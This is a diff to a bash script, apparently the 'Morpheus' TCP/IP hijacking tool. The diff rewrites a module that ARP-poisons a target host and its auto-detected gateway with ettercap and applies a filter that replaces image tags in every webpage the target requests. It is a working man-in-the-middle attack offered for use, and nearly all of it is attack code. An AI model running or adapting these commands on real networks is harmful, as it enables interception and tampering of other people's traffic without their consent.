@@ -122,12 +122,14 @@ V3R="1.6"                            # module version number
 cnm="Antidote"                       # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
-GaTe=`ip route | grep "default" | awk {'print $3'}`
+GaTe=`ip route | grep "default" | awk {'print $3'}`     # gateway
+IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`  # ip-range
 PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
 LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
 IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
 Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
 Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
+
 
 
 
@@ -287,11 +289,13 @@ fi
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
 sh_stage3 () {
-cat << !
----
--- This module ...
----
-!
+
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${white}This filter will substitute the html tag '<img src=>'             ${BlueF}|"
+echo "${BlueF}    | ${white}and injects your image in any webpage requested by target         ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
 sleep 2
 # run module?
 rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
@@ -299,16 +303,13 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 250) > /dev/null 2>&1
-
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.bk > /dev/null 2>&1
-  sleep 1
+echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.bk > /dev/null 2>&1
+sleep 1
 
   echo ${BlueF}[☠]${white} Edit img_replace.eft '(filter)'${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 250) > /dev/null 2>&1
+ fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 250) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
@@ -326,26 +327,27 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
     cd $IPATH/logs
 
       # run mitm+filter
+      # HINT: irongeek nao usou UID 0 e SSL active...
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
       echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one// /$GaTe//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one// /$GaTe//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one/ /$GaTe/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one/ /$GaTe/
         fi
       fi
 
